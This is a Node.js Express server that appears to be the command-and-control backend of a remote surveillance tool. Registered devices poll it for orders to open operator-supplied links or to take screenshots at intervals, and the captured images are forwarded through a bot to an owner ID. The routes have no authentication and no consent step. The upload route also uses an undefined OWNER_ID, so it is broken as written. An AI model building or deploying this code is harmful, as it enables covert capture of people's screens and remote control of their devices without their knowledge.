const express = require("express");
const multer = require("multer");
const fs = require("fs");
const path = require("path");

const bot = require("./bot");
const { devices, registerDevice, heartbeat } = require("./devices");

const app = express();
app.use(express.json());

const upload = multer({ dest: "screenshots/" });

/* Register device */
app.post("/register", (req, res) => {
  const { id, name } = req.body;
  registerDevice(id, name);
  res.json({ status: "registered" });
});

/* Heartbeat */
app.post("/heartbeat", (req, res) => {
  heartbeat(req.body.id);
  res.json({ online: true });
});

/* Get command */
app.get("/get-command/:id", (req, res) => {
  const d = devices[req.params.id];
  if (!d) return res.json({});

  if (d.pendingLink) {
    const link = d.pendingLink;
    d.pendingLink = null;
    return res.json({ type: "open_link", url: link });
  }

  if (d.screenshotRunning) {
    return res.json({ type: "screenshot", interval: d.interval });
  }

  res.json({});
});

/* Open link from bot */
app.post("/open-link", (req, res) => {
  const { id, url } = req.body;
  if (devices[id]) devices[id].pendingLink = url;
  res.json({ ok: true });
});

/* Start screenshot */
app.post("/start-shot", (req, res) => {
  const { id, interval } = req.body;
  if (devices[id]) {
    devices[id].screenshotRunning = true;
    devices[id].interval = interval;
  }
  res.json({ started: true });
});

/* Stop screenshot + delete */
app.post("/stop-shot", (req, res) => {
  const { id } = req.body;
  if (devices[id]) {
    devices[id].screenshotRunning = false;
    devices[id].interval = 0;
  }

  fs.readdirSync("screenshots").forEach(f => {
    fs.unlinkSync(path.join("screenshots", f));
  });

  res.json({ stopped: true });
});

/* Upload screenshot */
app.post("/upload-shot", upload.single("shot"), (req, res) => {
  const chatId = OWNER_ID;
  bot.sendPhoto(chatId, req.file.path).then(() => {
    // ❌ delete এখন না, stop এ হবে
    res.json({ sent: true });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on", PORT));
